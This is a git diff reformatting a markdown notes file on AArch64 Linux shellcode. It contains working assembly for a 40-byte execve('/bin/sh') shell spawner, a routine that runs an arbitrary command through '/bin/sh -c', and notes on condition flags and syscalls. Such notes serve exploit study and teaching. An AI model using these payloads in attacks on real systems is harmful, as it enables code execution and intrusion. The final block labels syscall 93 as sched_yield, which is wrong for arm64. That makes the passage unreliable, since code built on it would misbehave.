@@ -1,10 +1,11 @@
-### System Calls
-All registers except those required to return values are preserved. System calls return results in x0 while everything else remains the same, including the conditional flags. 
+## SysCalls
 
+All registers except those required to return values are preserved. 
+System calls return results in x0 while everything else remains the same, including the conditional flags. 
 The main system instruction for shellcodes on linux is supervisor call (SVC)
 
-```arm
-  @ read condition flags
+```asm
+   // read condition flags
   .equ OVERFLOW_FLAG, 1 << 28
   .equ CARRY_FLAG,    1 << 29
   .equ ZERO_FLAG,     1 << 30
@@ -12,15 +13,15 @@ The main system instruction for shellcodes on linux is supervisor call (SVC)
 
   mrs    x0, nzcv
 
-  @ set C (arry) flag
+   // set C (arry) flag
   mov    w0, CARRY_FLAG
   msr    nzcv, x0
 ```
 
 ### Executing a shell
 
-```arm
-@ 40 bytes
+```asm
+ // 40 bytes
 
     .arch armv8-a
 
@@ -30,19 +31,19 @@ The main system instruction for shellcodes on linux is supervisor call (SVC)
     .text
 
 _start:
-    @ execve("/bin/sh", NULL, NULL);
+     // execve("/bin/sh", NULL, NULL);
     mov    x8, SYS_execve
-    mov    x2, xzr           @ NULL
-    mov    x1, xzr           @ NULL
-    movq   x3, BINSH         @ "/bin/sh"
-    str    x3, [sp, -16]!    @ stores string on stack
+    mov    x2, xzr            // NULL
+    mov    x1, xzr            // NULL
+    movq   x3, BINSH          // "/bin/sh"
+    str    x3, [sp, -16]!     // stores string on stack
     mov    x0, sp
     svc    0
 ```
 
 ### Executing a command
 
-```arm
+```asm
     .arch armv8-a
     .align 4
 
@@ -52,18 +53,18 @@ _start:
     .text
 
 _start:
-    @ execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
-    movq   x0, BINSH             @ x0 = "/bin/sh\0"
+     // execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
+    movq   x0, BINSH              // x0 = "/bin/sh\0"
     str    x0, [sp, -64]!
     mov    x0, sp
-    mov    x1, 0x632D            @ x1 = "-c"
+    mov    x1, 0x632D             // x1 = "-c"
     str    x1, [sp, 16]
     add    x1, sp, 16
-    adr    x2, cmd               @ x2 = cmd
-    stp    x0, x1,  [sp, 32]     @ store "-c", "/bin/sh"
-    stp    x2, xzr, [sp, 48]     @ store cmd, NULL
-    mov    x2, xzr               @ penv = NULL
-    add    x1, sp, 32            @ x1 = argv
+    adr    x2, cmd                // x2 = cmd
+    stp    x0, x1,  [sp, 32]      // store "-c", "/bin/sh"
+    stp    x2, xzr, [sp, 48]      // store cmd, NULL
+    mov    x2, xzr                // penv = NULL
+    add    x1, sp, 32             // x1 = argv
     mov    x8, SYS_execve
     svc    0
 cmd:
@@ -72,8 +73,8 @@ cmd:
 
 ### Check for syscall errors
 
-```arm
-// linux sysCall to yield to another thread on the same core voluntarily
+linux sysCall to yield to another thread on the same core voluntarily
+```asm
 thread_yield:
     INIT_FRAME
     mov     x8, #93             // `sched_yield` linux syscall
